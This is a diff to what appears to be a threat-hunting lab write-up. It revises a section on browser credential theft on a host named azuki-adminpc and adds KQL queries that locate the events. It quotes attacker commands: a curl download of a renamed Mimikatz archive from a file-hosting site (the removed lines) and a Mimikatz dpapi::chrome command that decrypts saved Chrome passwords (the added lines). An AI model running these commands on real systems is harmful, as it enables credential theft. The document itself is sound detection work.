@@ -335,22 +335,24 @@ DeviceProcessEvents
 
 ---
 
-### 17. XXXX
+### 17. Credential Access: Browser Credential Theft
 
-Searched for evidence of credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
+Searched for evidence of credential theft targeting browser password stores and discovered that the attacker utilized the following Mimikatz command to extract Chrome saved passwords by decrypting the Login Data database using Windows Data Protection API (DPAPI): "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit. Note that dpapi::chrome is the Chrome credential extraction module and /unprotect is used to decrypt credentials using Windows DPAPI.
+
 
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where TimeGenerated >= datetime(2025-11-19)
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
 | where DeviceName == "azuki-adminpc"
-| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "catbox"
-| project TimeGenerated, ProcessCommandLine
+| where ProcessCommandLine has "chrome"
+| where FileName has_any ("m.exe","m-temp.exe")  
+| project TimeGenerated, FileName, ProcessCommandLine
 | order by TimeGenerated asc
 
 ```
-<img width="1831" height="475" alt="BT_Q20" src="https://github.com/user-attachments/assets/141d1c0c-a3dc-4936-8d1b-91c56f32fe36" />
+<img width="2573" height="284" alt="BT_Q21" src="https://github.com/user-attachments/assets/0545b6a1-8e3a-49d5-b327-bb4b2e65bc66" />
 
 ---
 
